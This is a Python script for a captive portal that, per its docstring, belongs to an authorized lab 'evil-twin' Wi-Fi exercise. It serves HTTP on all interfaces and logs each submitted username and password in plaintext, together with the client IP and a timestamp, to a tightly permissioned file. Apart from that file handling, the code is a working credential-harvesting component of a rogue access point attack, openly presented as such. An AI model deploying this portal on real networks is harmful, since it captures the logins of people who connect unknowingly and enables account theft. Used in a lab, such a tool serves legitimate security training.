#!/usr/bin/env python3
"""Minimal captive portal used by ewave's authorized lab evil-twin exercise."""

import argparse
import json
import os
import stat
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlparse

def clean(value):
    return value.replace("\t", " ").replace("\r", " ").replace("\n", " ")[:256]


def open_credentials(path, flags, expected=None):
    # Validate before truncating, including when sudo opens a backend-owned inode.
    path = os.path.abspath(path)
    parent, name = os.path.split(path)
    if os.path.realpath(parent) != parent:
        raise PermissionError("Credential directory must not contain symbolic links")
    directory = os.open(parent, os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW)
    fd = None
    try:
        owner = os.fstat(directory)
        allowed = {os.geteuid(), int(os.environ.get("SUDO_UID", os.geteuid()))}
        if owner.st_uid not in allowed or stat.S_IMODE(owner.st_mode) & 0o077:
            raise PermissionError("Credential directory must be private and backend-owned")
        safe_flags = (flags & ~os.O_TRUNC) | os.O_NOFOLLOW | os.O_NONBLOCK
        try:
            fd = os.open(name, safe_flags, dir_fd=directory)
        except FileNotFoundError:
            if expected is not None:
                raise PermissionError("Credential log was removed")
            fd = os.open(name, safe_flags | os.O_CREAT | os.O_EXCL, 0o600, dir_fd=directory)
        info = os.fstat(fd)
        if (not stat.S_ISREG(info.st_mode) or info.st_nlink != 1 or info.st_uid != owner.st_uid
                or stat.S_IMODE(info.st_mode) & 0o077
                or expected is not None and (info.st_dev, info.st_ino) != expected):
            raise PermissionError("Credential log must be a private backend-owned regular file")
        if flags & os.O_TRUNC:
            os.ftruncate(fd, 0)
        return fd
    except BaseException:
        if fd is not None:
            os.close(fd)
        raise
    finally:
        os.close(directory)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--creds", required=True)
    args = parser.parse_args()
    fd = open_credentials(args.creds, os.O_WRONLY | os.O_TRUNC)
    os.fchmod(fd, 0o600)
    info = os.fstat(fd)
    expected = (info.st_dev, info.st_ino)
    os.close(fd)
    class Handler(BaseHTTPRequestHandler):
        def send_json(self, value, status=200):
            body = json.dumps(value).encode("utf-8")
            self.send_response(status)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.send_header("Cache-Control", "no-store")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self):
            self.send_json({"service": "ewave-lab-portal", "status": "running"})

        def do_POST(self):
            if urlparse(self.path).path != "/submit":
                self.send_json({"error": "Unknown endpoint"}, 404)
                return
            try:
                length = int(self.headers.get("Content-Length", "0") or "0")
            except ValueError:
                length = 0
            body = self.rfile.read(min(max(length, 0), 65536)).decode("utf-8", "replace")
            form = parse_qs(body, keep_blank_values=True)
            username = clean((form.get("username") or [""])[0])
            password = clean((form.get("password") or [""])[0])
            client = clean(self.client_address[0])
            fd = open_credentials(args.creds, os.O_WRONLY | os.O_APPEND, expected)
            with os.fdopen(fd, "a", encoding="utf-8") as log:
                os.fchmod(log.fileno(), 0o600)
                log.write("%s\t%s\t%s\t%s\n" % (time.strftime("%Y-%m-%dT%H:%M:%S"), client,
                                                username, password))
                log.flush()
            self.send_json({"status": "recorded"})

        def log_message(self, fmt, *values):
            pass

    server = ThreadingHTTPServer(("0.0.0.0", args.port), Handler)
    server.serve_forever()


if __name__ == "__main__":
    main()
